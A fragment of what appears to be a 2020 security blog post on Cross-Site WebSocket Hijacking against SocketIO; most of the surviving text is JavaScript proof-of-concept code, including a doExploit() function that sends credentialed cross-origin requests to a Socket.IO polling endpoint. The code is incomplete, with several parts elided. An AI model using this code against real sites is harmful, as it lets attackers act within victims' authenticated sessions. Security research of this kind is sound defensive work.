...
date: Aug 17, 2020
description: "Cross-Site WebSocket Hijacking or CSWSH deep dive with examples of how this can be used against SocketIO."
tags: [web]
featured: true
---
...
```javascript
fetch(base_url + "/socket.io/?EIO=3&transport=polling&sid=" + sid, {
  method: "POST",
  credentials: "include",
  body: "8:40/test,",
});
...
```javascript
const res = fetch(base_url + "/socket.io/?EIO=3&transport=polling&sid=" + sid, {
  credentials: "include",
});
...
async function doExploit() {
  ...
  // handshake
  await fetch(base_url + "/socket.io/?EIO=3&transport=polling&sid=" + sid, {
    method: "POST",
    mode: "no-cors",
    credentials: "include",
    body: "8:40/test,",
  ...
  // start initial poll
  res = await fetch(
    base_url + "/socket.io/?EIO=3&transport=polling&sid=" + sid,
    { credentials: "include" },
  );
  text = await res.text();
